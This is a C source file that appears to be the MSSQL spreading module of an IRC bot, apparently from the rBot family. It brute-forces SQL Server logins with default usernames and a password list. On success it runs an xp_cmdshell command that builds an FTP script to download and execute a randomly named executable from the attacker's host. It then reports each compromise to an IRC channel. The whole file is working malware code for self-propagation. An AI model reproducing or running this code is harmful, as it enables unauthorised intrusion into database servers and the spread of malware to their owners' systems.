#include "includes.h"
#include "functions.h"

#ifndef NO_MSSQL

extern char *mypasses[];

BOOL mssql(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
	char database[]="", *users[]={"sa","root","admin",NULL};

	BOOL bRet=FALSE;

	SQLHANDLE hEnv;
	SQLHDBC hDbc = SQL_NULL_HDBC;     
	SQLHSTMT hStmt = SQL_NULL_HSTMT;
    SQLCHAR szOutConn[1024], constr[1024], command[1024];
	SQLSMALLINT sLen;

	if (fSQLAllocHandle(SQL_HANDLE_ENV,SQL_NULL_HANDLE,&hEnv) != SQL_SUCCESS)
		return bRet;

	if (fSQLSetEnvAttr(hEnv, SQL_ATTR_ODBC_VERSION,(SQLPOINTER) SQL_OV_ODBC3, SQL_IS_INTEGER) != SQL_SUCCESS)
		return bRet;

	if (fSQLAllocHandle(SQL_HANDLE_DBC,hEnv,(SQLHDBC FAR*)&hDbc) != SQL_SUCCESS) {
		fSQLFreeHandle(SQL_HANDLE_ENV, hEnv);
		return bRet;
	}

	for (int i=0; users[i]; i++) {

	//	if (exinfo.verbose)
	//		irc->privmsg(target,"%s %s: Trying IP: %s:%d, %s",scan_title, exploit[exinfo.exploit].name, exinfo.ip,exinfo.port, users[i]);

		for (int j=0; mypasses[j]; j++) {
			sprintf((char *)constr, "DRIVER={SQL Server};SERVER=%s,%d;UID=%s;PWD=%s;%s",exinfo.ip,exinfo.port,users[i],mypasses[j],database); 
			SQLRETURN nResult = fSQLDriverConnect(hDbc, NULL, constr, (SQLSMALLINT)strlen((char *)constr), szOutConn, 1024, &sLen, SQL_DRIVER_NOPROMPT);
			if (nResult == SQL_SUCCESS || nResult == SQL_SUCCESS_WITH_INFO) {
				fSQLAllocHandle(SQL_HANDLE_STMT,hDbc, &hStmt);

			//	if (exinfo.verbose)
			//		irc->privmsg(target,"%s %s: Connected to IP: %s:%d",scan_title, exploit[exinfo.exploit].name, exinfo.ip,exinfo.port);

				char fname[_MAX_FNAME];
				sprintf(fname,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
				sprintf((char *)command,"EXEC master..xp_cmdshell 'del eq&echo open %s %d >> eq&echo user 1 1 >> eq &echo get %s >> eq &echo quit >> eq &ftp -n -s:eq &%s&del eq\r\n'",(PrivateIP(exinfo.ip)?inip:exip),FTP_PORT,fname,fname);

				if (fSQLExecDirect(hStmt, (SQLTCHAR*)&command, SQL_NTS) == SQL_SUCCESS) {
					bRet=TRUE;
					if (!exinfo.silent)
						irc->privmsg(target,"%s %s: Exploiting IP: %s:%d, %s/%s",scan_title, exploit[exinfo.exploit].name, exinfo.ip,exinfo.port, users[i], ((strcmp(mypasses[j],"")==0)?("(Blank)"):(mypasses[j])));
					exploit[exinfo.exploit].stats++;

					break;
				}
				fSQLFreeHandle(SQL_HANDLE_STMT, hStmt);

				break;
			}
			Sleep(500);
		}
		if (bRet == TRUE)
			break;
	}

	fSQLFreeHandle(SQL_HANDLE_DBC, hDbc);
	fSQLFreeHandle(SQL_HANDLE_ENV, hEnv);

	if (!bRet && !exinfo.silent && exinfo.verbose)
		irc->privmsg(target,"%s %s: Failed to exploit IP: %s:%d",scan_title, exploit[exinfo.exploit].name, exinfo.ip,exinfo.port);
	return bRet;
}
#endif